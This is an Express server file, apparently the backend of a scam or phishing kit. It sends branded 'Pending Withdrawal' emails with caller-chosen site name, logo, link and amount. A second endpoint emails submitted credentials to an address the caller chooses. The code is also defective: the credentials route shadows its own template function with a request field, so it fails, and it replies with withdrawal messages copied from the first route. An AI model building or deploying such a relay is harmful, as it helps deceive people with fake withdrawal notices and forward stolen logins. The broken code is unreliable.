import express from "express";
import "dotenv/config";
import mailer from "./mailer/index.js";
import withdrawal from "./template/withdrawal.js";
import credentials from "./template/creds.js";
import cors from "cors";

const PORT = process.env.PORT || 8081;
const app = express();

app.use(
  cors()
);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get("/", (_, res) => {
  res.send({ success: "Hello World!" });
});

app.post("/send/withdrawal/email", async (req, res) => {
  try {
    const sub = "Pending Withdrawal";
    const { siteName, sender, password, from, email, amt, name, link, logo } =
      req.body;
    await mailer(
      sender,
      password,
      from,
      email,
      sub,
      withdrawal(amt, name, link, logo, siteName)
    )
      .then((data) => {
        return res.send({ success: "Withdrawal Success!" });
      })
      .catch((error) => {
        return res.send({ error: "Withdrawal Faild!" });
      });
  } catch (error) {
    console.log(error);
  }
});

app.post("/send/creds/email", async (req, res) => {
  try {
    const sub = "Credentials";
    const { sender, password, from, email, credentials } =
      req.body;
    await mailer(
      sender,
      password,
      from,
      email,
      sub,
      credentials(credentials)
    )
      .then((data) => {
        return res.send({ success: "Withdrawal Success!" });
      })
      .catch((error) => {
        return res.send({ error: "Withdrawal Faild!" });
      });
  } catch (error) {
    console.log(error);
  }
});

app.listen(PORT, () => {
  console.log(`Server on PORT::${PORT}`);
});
